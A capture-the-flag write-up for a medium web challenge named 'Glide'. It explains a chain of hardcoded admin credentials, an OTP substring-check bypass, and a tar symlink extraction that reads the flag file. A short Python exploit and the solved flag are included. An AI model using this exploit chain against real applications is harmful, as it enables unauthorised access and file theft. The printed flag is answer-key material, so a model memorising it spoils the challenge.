# Glide

- **Lab / Category:** Web
- **Points:** 170
- **Difficulty:** medium
- **Challenge ID:** (see metadata.json)
- **Status:** ✅ SOLVED

## Vulnerability chain
1. **Hardcoded login** — `admin` / `admin`.
2. **Broken OTP check** — `otp, _otp = generate_otp(), request.form['otp']; if otp in _otp:`
   compares the fresh random 4-digit OTP as a **substring** of attacker input. Submitting a
   string that contains every 4-digit sequence makes the check always pass:
   `"".join("%04d" % i for i in range(10000))`.
3. **Tar `extractall` symlink → arbitrary file read** — uploaded tar is extracted with
   `tar_ref.extractall('uploads')` with no member filtering. A tar member that is a **symlink**
   pointing at `/app/flag.txt` is created inside `uploads/`, then served by
   `/uploads/<name>` (which follows the symlink).

## Exploit
```python
s.post(B+"/login", data={"username":"admin","password":"admin"})
s.post(B+"/otp",   data={"otp":"".join("%04d"%i for i in range(10000))})
# tar with a symlink member: name="link", type=SYMTYPE, linkname="/app/flag.txt"
s.post(B+"/", files={"file":("x.tar", tar_bytes, "application/x-tar")})
print(s.get(B+"/uploads/link").text)   # -> flag
```

Confirmed `/app/flag.txt` is the flag location (symlink to `/app/app.py` also dumped source).

## Flag
`FlagY{9572d047d26797480ae73301c89c279f}`

_Submission: ACCEPTED._
